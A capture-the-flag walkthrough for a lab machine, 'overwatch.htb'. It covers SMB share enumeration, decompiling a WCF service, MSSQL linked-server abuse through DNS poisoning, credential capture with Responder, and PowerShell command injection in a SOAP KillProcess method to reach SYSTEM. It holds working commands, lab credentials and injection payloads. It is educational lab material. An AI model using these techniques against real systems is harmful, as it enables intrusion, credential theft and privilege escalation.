SMB Share & WCF Binary Analysis

Using the sqlsvc credentials obtained during recon, enumeration of SMB shares reveals a software$ share with READ access:

bash
nxc smb 10.129.244.81 -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --shares
ℹ  software$ share contains: C:\Software\Monitoring\overwatch.exe and overwatch.exe.config

Decompile the .NET binary using ilspycmd to recover the service interface and source logic:

bash
ilspycmd overwatch.exe -p -o ./decompiled/

IMonitoringService interface — methods discovered:

WCF KillProcess — PowerShell Command Injection
Unsanitised String Concatenation in PowerShell Runspace Execution
The KillProcess method builds a PowerShell command via direct string concatenation with user input, then executes it through a PowerShell Runspace running as NT AUTHORITY\SYSTEM. The service listens on localhost:8000 only — reachable from any local shell on the box.
c# — decompiled KillProcess (vulnerable)
string text = "Stop-Process -Name " + processName + " -Force";
// text is executed directly in a PowerShell Runspace as SYSTEM
// No sanitisation — classic command injection

Phase 2 — MSSQL Exploitation

Initial MSSQL Access

Connect to the MSSQL instance at port 6520 using the recovered sqlsvc credentials:

python — impacket
from impacket.tds import MSSQL
ms = MSSQL('10.129.244.81', 6520)
ms.connect()
ms.login(None, 'sqlsvc', 'TI0LKcfHzZw1Vv', 'overwatch.htb', useWindowsAuth=True)
FindingDetail
sqlsvc roledb_owner on overwatch database — NOT sysadmin
xp_cmdshellDenied
OLE Automation / CLRDisabled
Linked server: SQL07Unreachable — DNS resolution fails. rpc_out enabled.
⚠  SQL07 is a linked server with is_rpc_out_enabled=1 but its hostname does not resolve — the target for DNS poisoning.
DNS Poisoning

Using krbrelayx dnstool.py, add an A record for SQL07.overwatch.htb pointing to the attacker IP — making the linked server reachable and redirecting its outbound connection to our Responder listener:

bash
python3 dnstool.py -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
    -r SQL07.overwatch.htb -a add -t A -d 10.10.14.68 10.129.244.81
✓  DNS A record added: SQL07.overwatch.htb → 10.10.14.68 (attacker IP)
Credential Capture via Linked Server

Start Responder to intercept the MSSQL authentication when the linked server connection is triggered:

bash
sudo responder -I tun0

Trigger the linked server connection via MSSQL:

sql
EXEC ('SELECT 1') AT [SQL07]

The SQL Server service on the target connects to our rogue SMB server (via the poisoned DNS record), and Responder captures the outbound MSSQL cleartext authentication:

output — responder
[MSSQL] Cleartext credentials captured!
Username : sqlmgmt
Password : bIhBbzMMnB82yx
✓  Captured cleartext MSSQL credentials: sqlmgmt : bIhBbzMMnB82yx

Phase 4 — SYSTEM via WCF Command Injection

The overwatch.exe WCF service runs as NT AUTHORITY\SYSTEM and listens on localhost:8000. From the WinRM shell as sqlmgmt, the service is directly accessible.

Injection Payload Construction

The vulnerable code builds: Stop-Process -Name {input} -Force

Injecting a semicolon breaks out of Stop-Process and appends arbitrary PowerShell commands. The trailing ;# comments out the remaining -Force flag:

payload structure
Input:    x; <COMMAND> ;#
Executed: Stop-Process -Name x; <COMMAND> ;# -Force
                              ^--- breaks out ^--- comments out remainder
SOAP Request Execution (from WinRM shell)
powershell — sqlmgmt WinRM shell
$payload = 'x; whoami | Out-File C:\Users\sqlmgmt\Desktop\output.txt ;#'
$soap = '<?xml version="1.0" encoding="utf-8"?>' +
    '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
    '<s:Body><KillProcess xmlns="http://tempuri.org/">' +
    '<processName>' + $payload + '</processName>' +
    '</KillProcess></s:Body></s:Envelope>'

$h = @{"SOAPAction"='"http://tempuri.org/IMonitoringService/KillProcess"'}
Invoke-WebRequest -Uri "http://localhost:8000/MonitorService" `
    -Method POST -ContentType "text/xml; charset=utf-8" `
    -Headers $h -Body $soap -UseBasicParsing
✓  Command executes as NT AUTHORITY\SYSTEM — arbitrary PowerShell runs with full system privileges.

To read the root flag, replace the payload with:

powershell — root flag payload
$payload = 'x; type C:\Users\Administrator\Desktop\root.txt | Out-File C:\Users\sqlmgmt\Desktop\root_out.txt ;#'
